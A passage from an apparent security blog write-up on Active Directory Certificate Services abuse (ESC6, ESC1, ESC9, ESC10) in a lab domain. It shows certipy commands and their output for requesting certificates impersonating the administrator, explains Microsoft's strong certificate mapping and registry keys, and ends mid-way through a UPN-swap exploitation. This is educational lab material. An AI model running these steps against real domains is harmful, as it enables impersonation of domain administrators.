+    <span class="n">Request</span> <span class="n">Disposition</span>                 <span class="p">:</span> <span class="n">Issue</span>
+    <span class="n">Enforce</span> <span class="n">Encryption</span> <span class="k">for</span> <span class="n">Requests</span>     <span class="p">:</span> <span class="n">Enabled</span>
+    <span class="n">Permissions</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+        <span class="n">Enroll</span>                          <span class="p">:</span> <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>\<span class="n">Authenticated</span> <span class="n">Users</span>
+    <span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Vulnerabilities</span>
+      <span class="n">ESC6</span>                              <span class="p">:</span> <span class="n">Enrollees</span> <span class="n">can</span> <span class="n">specify</span> <span class="n">SAN</span> <span class="ow">and</span> <span class="n">Request</span> <span class="n">Disposition</span> <span class="ow">is</span> <span class="nb">set</span> <span class="n">to</span> <span class="n">Issue</span><span class="o">.</span> <span class="n">Does</span> <span class="ow">not</span> <span class="n">work</span> <span class="n">after</span> <span class="n">May</span> <span class="mi">2022</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+</pre></div>
+<p>As shown, the CA appears exploitable via <strong>ESC6</strong>. However, as <code>certipy</code> highlights, the attack does not work on systems patched with the May 2022 update.</p><br/>
+<p>Nevertheless, let’s try requesting a certificate using the <code>User</code> template, providing our own <code>UPN</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">template</span> <span class="n">User</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'elswixcorp-DC01-CA'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">upn</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">requested</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">82</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">UPN</span> <span class="s1">'administrator@elswixcorp.local'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="nb">object</span> <span class="n">SID</span> <span class="ow">is</span> <span class="s1">'S-1-5-21-4266111273-315482142-3017431568-1103'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'administrator.pfx'</span>
+</pre></div>
+<p>As expected, the request succeeded and we obtained a certificate with the UPN <code>administrator@elswixcorp.local</code>. However, <code>certipy</code> also reveals that the certificate’s <code>objectSid</code> is <code>S-1-5-21-4266111273-315482142-3017431568-1103</code>. This confirms that the <code>objectSid</code> extension is present, and that the SID corresponds to the <code>elswix</code> account, even though the SAN UPN is <code>administrator@elswixcorp.local</code>.</p><br/>
+<p>Let’s now attempt to authenticate to the KDC using this certificate:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Object</span> <span class="n">SID</span> <span class="n">mismatch</span> <span class="n">between</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">user</span> <span class="s1">'administrator'</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Verify</span> <span class="n">that</span> <span class="n">user</span> <span class="s1">'administrator'</span> <span class="n">has</span> <span class="nb">object</span> <span class="n">SID</span> <span class="s1">'S-1-5-21-4266111273-315482142-3017431568-1103'</span>
+</pre></div>
+<p>And as expected, it failed. This is because the KDC retrieves the <code>objectSid</code> value from the certificate, locates the corresponding account, and then checks whether that account matches the one specified in the SAN UPN.</p><br/>
+<h3>ESC1 not working</h3><br/>
+<p>As I mentioned earlier, <strong>ESC1</strong> should still work because the <code>objectSid</code> extension is not included in certificates issued from templates with the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag enabled.</p><br/>
+<p>Let’s verify whether this is accurate. First, we’ll search for vulnerable templates using <code>certipy</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">find</span> <span class="o">-</span><span class="n">vulnerable</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">stdout</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">35</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">authorities</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">certificate</span> <span class="n">authorities</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">25</span> <span class="n">enabled</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="n">Certificate</span> <span class="n">Templates</span>
+  <span class="mi">0</span>
+    <span class="n">Template</span> <span class="n">Name</span>                       <span class="p">:</span> <span class="n">ESC1</span>
+    <span class="n">Display</span> <span class="n">Name</span>                        <span class="p">:</span> <span class="n">ESC1</span>
+    <span class="n">Certificate</span> <span class="n">Authorities</span>             <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>
+    <span class="n">Enabled</span>                             <span class="p">:</span> <span class="kc">True</span>
+    <span class="n">Client</span> <span class="n">Authentication</span>               <span class="p">:</span> <span class="kc">True</span>
+    <span class="n">Enrollment</span> <span class="n">Agent</span>                    <span class="p">:</span> <span class="kc">False</span>
+    <span class="n">Any</span> <span class="n">Purpose</span>                         <span class="p">:</span> <span class="kc">False</span>
+    <span class="n">Enrollee</span> <span class="n">Supplies</span> <span class="n">Subject</span>           <span class="p">:</span> <span class="kc">True</span>
+    <span class="n">Certificate</span> <span class="n">Name</span> <span class="n">Flag</span>               <span class="p">:</span> <span class="n">EnrolleeSuppliesSubject</span>
+    <span class="n">Enrollment</span> <span class="n">Flag</span>                     <span class="p">:</span> <span class="n">PublishToDs</span>
+                                          <span class="n">IncludeSymmetricAlgorithms</span>
+    <span class="n">Private</span> <span class="n">Key</span> <span class="n">Flag</span>                    <span class="p">:</span> <span class="n">ExportableKey</span>
+    <span class="n">Extended</span> <span class="n">Key</span> <span class="n">Usage</span>                  <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span>
+                                          <span class="n">Secure</span> <span class="n">Email</span>
+                                          <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span>
+    <span class="n">Requires</span> <span class="n">Manager</span> <span class="n">Approval</span>           <span class="p">:</span> <span class="kc">False</span>
+    <span class="n">Requires</span> <span class="n">Key</span> <span class="n">Archival</span>               <span class="p">:</span> <span class="kc">False</span>
+    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>      <span class="p">:</span> <span class="mi">0</span>
+    <span class="n">Validity</span> <span class="n">Period</span>                     <span class="p">:</span> <span class="mi">1</span> <span class="n">year</span>
+    <span class="n">Renewal</span> <span class="n">Period</span>                      <span class="p">:</span> <span class="mi">6</span> <span class="n">weeks</span>
+    <span class="n">Minimum</span> <span class="n">RSA</span> <span class="n">Key</span> <span class="n">Length</span>              <span class="p">:</span> <span class="mi">2048</span>
+    <span class="n">Permissions</span>
+      <span class="n">Enrollment</span> <span class="n">Permissions</span>
+        <span class="n">Enrollment</span> <span class="n">Rights</span>               <span class="p">:</span> <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>\<span class="n">Domain</span> <span class="n">Admins</span>
+                                          <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>\<span class="n">Domain</span> <span class="n">Users</span>
+                                          <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+                                          <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>\<span class="n">Administrator</span>
+    <span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Vulnerabilities</span>
+      <span class="n">ESC1</span>                              <span class="p">:</span> <span class="s1">'ELSWIXCORP.LOCAL</span><span class="se">\\</span><span class="s1">Domain Users'</span> <span class="n">can</span> <span class="n">enroll</span><span class="p">,</span> <span class="n">enrollee</span> <span class="n">supplies</span> <span class="n">subject</span> <span class="ow">and</span> <span class="n">template</span> <span class="n">allows</span> <span class="n">client</span> <span class="n">authentication</span>
+</pre></div>
+<p>As shown, the <code>ESC1</code> template is flagged as vulnerable to <strong>ESC1</strong> by <code>certipy</code>.</p><br/>
+<p>Next, let’s request a certificate using an arbitrary UPN:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">template</span> <span class="n">ESC1</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'elswixcorp-DC01-CA'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">upn</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">certificate</span> <span class="n">via</span> <span class="n">RPC</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">requested</span> <span class="n">certificate</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span> <span class="ow">is</span> <span class="mi">77</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="k">with</span> <span class="n">UPN</span> <span class="s1">'administrator@elswixcorp.local'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">has</span> <span class="n">no</span> <span class="nb">object</span> <span class="n">SID</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'administrator.pfx'</span>
+</pre></div>
+<p>As seen in the output, this time the certificate does <strong>not</strong> include an <code>objectSid</code>, as expected—since the <code>ESC1</code> template has the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag enabled.</p><br/>
+<p>Now, let’s attempt to authenticate using this certificate:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Object</span> <span class="n">SID</span> <span class="n">mismatch</span> <span class="n">between</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">user</span> <span class="s1">'administrator'</span>
+</pre></div>
+<p>As observed, the authentication failed. But why, if the certificate doesn’t have the <code>objectSid</code> extension?</p><br/>
+<p>Well, that’s actually the reason. Starting in February 2025, a security setting called <strong>strong mapping</strong> was introduced. This setting blocks the use of certificates <strong>without</strong> an <code>objectSid</code> extension for authentication. Prior to this update, <strong>ESC1</strong> was still a viable attack path.</p><br/>
+<p>So, what exactly is this "new" security setting? Let me explain.</p><br/>
+<p>In reality, this security setting is not new. What changed with the February 2025 update is that <strong>strong mapping</strong> is now enforced by default, whereas previously it had to be explicitly configured.</p><br/>
+<h3>StrongCertificateBindingEnforcement and CertificateMappingMethods</h3><br/>
+<p>Because the <code>objectSid</code> extension could completely break authentication with previously issued certificates, Microsoft introduced two registry keys to ensure backward compatibility:</p><br/>
+<ul>
+<li><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods</code> — used for SChannel-based authentication.    </li>
+<li><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement</code> — controls behavior for Kerberos authentication.</li>
+</ul>
+<p>The <code>CertificateMappingMethods</code> key operates as a bitmask, where each bit enables a different certificate mapping method for SChannel. For instance, setting it to <code>0x4</code> enables UPN-based mapping, while <code>0x1F</code> activates all available mapping methods. The default value is currently <code>0x18</code> (S4U2Self &amp; S4U2Self Explicit). If UPN mapping is enabled (note: it's <strong>not</strong> enabled by default), it can override the behavior of the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension—meaning that if UPN mapping succeeds, the presence of the extension is ignored. </p><br/>
+<p><img src="https://elswix.github.io/articles/18/img/1.png"></p><br/>
+<p>The second key, <code>StrongCertificateBindingEnforcement</code>, specifies how strictly the domain controller enforces validation of the new <code>objectSid</code> extension during certificate-based Kerberos authentication. It supports three values:</p><br/>
+<ul>
+<li>
+<p><strong>0 (Disabled):</strong> The extension is ignored entirely. The DC relies solely on SAN fields like UPN and DNS for mapping, even if the <code>objectSid</code> extension is present. This effectively reverts to pre-patch behavior. As of now, this setting is deprecated and no longer supported.</p><br/>
+</li>
+<li>
+<p><strong>1 (Compatibility mode) PREVIOUS DEFAULT:</strong> If the <code>objectSid</code> extension is present, the DC will attempt to validate it. If it’s missing, it falls back to SAN-based mapping. This provides compatibility while encouraging adoption of stronger validation.</p><br/>
+</li>
+<li>
+<p><strong>2 (Strict Enforcement) CURRENT DEFAULT:</strong> Only certificates with a valid <code>objectSid</code> extension can be used for authentication. Mapping based solely on SAN fields is not permitted, this means that certificates without this extension cannot be used for authentication. This is why our example of ESC1 did not work.</p><br/>
+</li>
+</ul>
+<p>When <code>StrongCertificateBindingEnforcement</code> is set to 1 or 2 and the extension is validated, Microsoft refers to this as <strong>"strong certificate mapping."</strong> If the registry keys are relaxed or set to legacy-compatible values, the system reverts to <strong>"weak mapping"</strong>, which mimics the behavior before the Certifried patch.</p><br/>
+<h3>ESC9 - No Security Extension</h3><br/>
+<p>There is a certificate template flag called <code>CT_FLAG_NO_SECURITY_EXTENSION</code>. When this flag is set, issued certificates <strong>do not</strong> include the <code>objectSid</code> extension. As a result, even when <code>StrongCertificateBindingEnforcement</code> is set to <code>1</code>, such certificates can still be used for authentication—making certain attack paths exploitable.</p><br/>
+<p>However, in modern environments, if <code>StrongCertificateBindingEnforcement</code> is set to <code>2</code> (which is now the <strong>default setting</strong>), the absence of the <code>objectSid</code> extension makes the certificate <strong>unusable</strong> for Kerberos authentication.</p><br/>
+<p>To demonstrate this scenario, I’ll manually set the <code>StrongCertificateBindingEnforcement</code> value to <code>1</code>. If you want to replicate this in your lab, you can execute the following command as an administrator on the domain controller:</p><br/>
+<div class="highlight"><pre><span></span><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="s2">"HKLM:\SYSTEM\CurrentControlSet\Services\Kdc"</span> <span class="n">-Name</span> <span class="s2">"StrongCertificateBindingEnforcement"</span> <span class="n">-Value</span> <span class="s2">"1"</span> <span class="n">-PropertyType</span> <span class="s2">"DWORD"</span>
+</pre></div>
+<p>You can enable the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> in a template using the following command: </p><br/>
+<div class="highlight"><pre><span></span><span class="n">certutil</span> <span class="n">-dstemplate</span> <span class="p">&lt;</span><span class="n">TemplateName</span><span class="p">&gt;</span> <span class="n">msPKI-Enrollment-Flag</span> <span class="p">+</span><span class="n">0x00080000</span>
+</pre></div>
+<h3>ESC9 Requirements</h3><br/>
+<p>To successfully exploit ESC9, the following conditions must be met:</p><br/>
+<ul>
+<li>
+<p><code>StrongCertificateBindingEnforcement</code> must <strong>not</strong> be set to <code>2</code> (default), or<br/>
+<code>CertificateMappingMethods</code> must be set to <strong>UPN</strong> (<code>0x4</code>) or <strong>ALL</strong> (<code>0x1F</code>) flag.</p><br/>
+</li>
+<li>
+<p>The certificate template must have the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag set in its <code>msPKI-Enrollment-Flag</code> attribute.</p><br/>
+</li>
+<li>
+<p>The template must allow <strong>Client Authentication</strong>.</p><br/>
+</li>
+<li>
+<p>You must have <strong>GenericWrite</strong> rights over an account (A), which will be used to impersonate or compromise another account (B).</p><br/>
+</li>
+</ul>
+<p>When a certificate template includes the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag, <code>certipy</code> will explicitly identify it:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">find</span> <span class="o">-</span><span class="n">vulnerable</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span>  <span class="o">-</span><span class="n">stdout</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">36</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">authorities</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">certificate</span> <span class="n">authorities</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">26</span> <span class="n">enabled</span> <span class="n">certificate</span> <span class="n">templates</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumeration</span> <span class="n">output</span><span class="p">:</span>
+<span class="n">Certificate</span> <span class="n">Templates</span>
+  <span class="mi">0</span>
+    <span class="n">Template</span> <span class="n">Name</span>                       <span class="p">:</span> <span class="n">ESC9</span>
+    <span class="n">Display</span> <span class="n">Name</span>                        <span class="p">:</span> <span class="n">ESC9</span>
+    <span class="n">Certificate</span> <span class="n">Authorities</span>             <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>
+    <span class="n">Enabled</span>                             <span class="p">:</span> <span class="kc">True</span>
+    <span class="n">Client</span> <span class="n">Authentication</span>               <span class="p">:</span> <span class="kc">True</span>
+    <span class="n">Enrollment</span> <span class="n">Agent</span>                    <span class="p">:</span> <span class="kc">False</span>
+    <span class="n">Any</span> <span class="n">Purpose</span>                         <span class="p">:</span> <span class="kc">False</span>
+    <span class="n">Enrollee</span> <span class="n">Supplies</span> <span class="n">Subject</span>           <span class="p">:</span> <span class="kc">False</span>
+    <span class="n">Certificate</span> <span class="n">Name</span> <span class="n">Flag</span>               <span class="p">:</span> <span class="n">SubjectRequireDirectoryPath</span>
+                                          <span class="n">SubjectRequireEmail</span>
+                                          <span class="n">SubjectAltRequireEmail</span>
+                                          <span class="n">SubjectAltRequireUpn</span>
+    <span class="n">Enrollment</span> <span class="n">Flag</span>                     <span class="p">:</span> <span class="n">NoSecurityExtension</span>
+                                          <span class="n">AutoEnrollment</span>
+                                          <span class="n">PublishToDs</span>
+                                          <span class="n">IncludeSymmetricAlgorithms</span>
+    <span class="n">Private</span> <span class="n">Key</span> <span class="n">Flag</span>                    <span class="p">:</span> <span class="mi">16777216</span>
+                                          <span class="mi">65536</span>
+                                          <span class="n">ExportableKey</span>
+    <span class="n">Extended</span> <span class="n">Key</span> <span class="n">Usage</span>                  <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span>
+                                          <span class="n">Secure</span> <span class="n">Email</span>
+                                          <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span>
+    <span class="n">Requires</span> <span class="n">Manager</span> <span class="n">Approval</span>           <span class="p">:</span> <span class="kc">False</span>
+    <span class="n">Requires</span> <span class="n">Key</span> <span class="n">Archival</span>               <span class="p">:</span> <span class="kc">False</span>
+    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>      <span class="p">:</span> <span class="mi">0</span>
+    <span class="n">Validity</span> <span class="n">Period</span>                     <span class="p">:</span> <span class="mi">1</span> <span class="n">year</span>
+    <span class="n">Renewal</span> <span class="n">Period</span>                      <span class="p">:</span> <span class="mi">6</span> <span class="n">weeks</span>
+    <span class="n">Minimum</span> <span class="n">RSA</span> <span class="n">Key</span> <span class="n">Length</span>              <span class="p">:</span> <span class="mi">2048</span>
+    <span class="n">Permissions</span>
+      <span class="n">Enrollment</span> <span class="n">Permissions</span>
+        <span class="n">Enrollment</span> <span class="n">Rights</span>               <span class="p">:</span> <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>\<span class="n">Domain</span> <span class="n">Admins</span>
+                                          <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>\<span class="n">Domain</span> <span class="n">Users</span>
+                                          <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+    <span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Vulnerabilities</span>
+      <span class="n">ESC9</span>                              <span class="p">:</span> <span class="s1">'ELSWIXCORP.LOCAL</span><span class="se">\\</span><span class="s1">Domain Users'</span> <span class="n">can</span> <span class="n">enroll</span> <span class="ow">and</span> <span class="n">template</span> <span class="n">has</span> <span class="n">no</span> <span class="n">security</span> <span class="n">extension</span>
+</pre></div>
+<p>I won’t go through the full exploitation process here, as it’s identical to what we demonstrated earlier in this section when discussing UPN mapping. The only difference is that this time, you’ll be using a certificate template with the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag enabled. Just follow the same steps, assuming that the <code>elswix</code> account has <code>GenericWrite</code> permissions over <code>claire</code>.</p><br/>
+<h3>ESC10 – Weak Certificate Mapping</h3><br/>
+<p><strong>ESC10</strong> involves exploiting weak or misconfigured settings in both the <code>StrongCertificateBindingEnforcement</code> and <code>CertificateMappingMethods</code> registry keys.</p><br/>
+<h3>Case 1: StrongCertificateBindingEnforcement = 0</h3><br/>
+<p>In the first case, <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code>, which completely disables <code>objectSid</code> verification. Even if the certificate includes the <code>objectSid</code> extension, it will be ignored. This effectively bypasses the security introduced in the Certifried patch.</p><br/>
+<p><strong>Note:</strong> This configuration is no longer supported, so it's unlikely you'll encounter it in modern environments—unless dealing with an outdated or poorly maintained system.</p><br/>
+<p><strong>Exploitation requirements for Case 1:</strong></p><br/>
+<ul>
+<li>
+<p><code>StrongCertificateBindingEnforcement</code> is set to <code>0</code>, disabling strong certificate mapping.</p><br/>
+</li>
+<li>
+<p>A certificate template with <strong>Client Authentication</strong> EKU enabled (any template will work, including the built-in <code>User</code> template).</p><br/>
+</li>
+<li>
+<p>The attacker has <code>GenericWrite</code> permissions over any account <strong>A</strong>, which allows them to modify its attributes (such as UPN or <code>dNSHostName</code>) to impersonate or redirect authentication to account <strong>B</strong>.</p><br/>
+</li>
+</ul>
+<p>The exploitation process is identical to what we've demonstrated earlier with <code>GenericWrite</code> over a user account. The same technique also applies to computer accounts.</p><br/>
+<h3>Case 2: CertificateMappingMethods = 0x4 (UPN Mapping) / 0x1F (All Mappings)</h3><br/>
+<p>In this scenario, the <code>CertificateMappingMethods</code> registry value is set to <code>0x4</code>, which enables <strong>UPN-based certificate mapping</strong>. When this flag is active, the domain controller prioritizes the UPN specified in the certificate’s SAN field, and the <code>objectSid</code> extension is ignored—as long as the UPN matches a valid user account.</p><br/>
+<p>Setting the value to <code>0x1F</code> enables <strong>all supported mapping methods</strong>, including UPN mapping, which leads to the same result.</p><br/>
+<p><strong>Exploitation requirements for Case 2:</strong></p><br/>
+<ul>
+<li>
+<p><code>CertificateMappingMethods</code> is set to either <code>0x4</code> (UPN mapping only) or <code>0x1F</code> (enables all mapping types).</p><br/>
+</li>
+<li>
+<p>A certificate template that allows <strong>Client Authentication</strong> (e.g., the default <code>User</code> template).</p><br/>
+</li>
+<li>
+<p>The attacker has <code>GenericWrite</code> permissions over any account <strong>A</strong>, which allows them to modify its attributes (such as UPN or <code>dNSHostName</code>) to impersonate or redirect authentication to account <strong>B</strong>.</p><br/>
+</li>
+</ul>
+<p>For this demonstration, I’ve configured the domain controller with <code>CertificateMappingMethods = 0x4</code> (setting it to <code>0x1F</code> would also work).:</p><br/>
+<div class="highlight"><pre><span></span><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="s2">"HKLM:\SYSTEM\CurrentControlSet\SecurityProviders\SCHANNEL\"</span> <span class="n">-Name</span> <span class="s2">"CertificateMappingMethods"</span> <span class="n">-Value</span> <span class="n">0x4</span> <span class="n">-PropertyType</span> <span class="s2">"DWORD"</span>
+</pre></div>
+<p>Let's now walk through the exploitation. In our example, the <code>elswix</code> user has <code>GenericWrite</code> permissions over <code>claire</code>, and we already obtained her NT hash in a previous step.</p><br/>
+<p>First, let’s change Claire’s UPN to <code>administrator@elswixcorp.local</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="n">!</span> <span class="o">-</span><span class="n">user</span> <span class="n">claire</span> <span class="o">-</span><span class="n">upn</span> <span class="n">administrator</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.3</span>
+<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>
+
